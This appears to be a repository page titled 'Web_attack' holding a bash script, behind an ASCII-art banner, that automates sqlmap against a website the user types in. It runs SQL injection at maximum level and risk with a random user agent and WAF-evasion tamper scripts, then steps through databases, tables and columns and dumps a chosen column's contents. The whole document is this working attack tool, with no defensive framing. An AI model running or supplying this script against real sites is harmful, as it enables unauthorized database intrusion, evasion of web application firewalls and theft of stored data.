# Web_attack
Web_attack


#### sqlmap automate

```
#!/bin/bash

clear



echo "
              *         *      *         *
          ***          **********          ***
       *****           **********           *****
     *******           **********           *******
   **********         ************         **********
  ****************************************************
 ******************************************************
********************************************************
********************************************************
********************************************************
 ******************************************************
  ********      ************************      ********
   *******       *     *********      *       *******
     ******             *******              ******
       *****             *****              *****
          ***             ***              ***
            **             *              **
"

echo
echo -n "[+] Website: " && read site
echo

python2 sqlmap.py -u $site --threads=10 --level=3 --risk=3 --random-agent --is-dba --current-db --tamper=charencode,space2comment,between,modsecurityzeroversioned --dbs --batch
echo
echo -n "[+] DB: " && read db
echo
		
python2 sqlmap.py -u $site --threads=10 --level=3 --risk=3 --random-agent --is-dba --current-db --tamper=between,modsecurityzeroversioned  -D $db --tables
																		 
echo
echo -n "[+] Table: " && read tb
echo

python2 sqlmap.py -u $site --threads=10 --level=3 --risk=3 --random-agent --is-dba --current-db --tamper=between,modsecurityzeroversioned --batch -D $db -T $tb --columns

echo
echo -n "[+] Column: " && read cl
echo

python2 sqlmap.py -u $site --threads=10 --level=3 --risk=3 --random-agent --is-dba --current-db --tamper=between,modsecurityzeroversioned --batch -D $db -T $tb -C $cl --dump

```
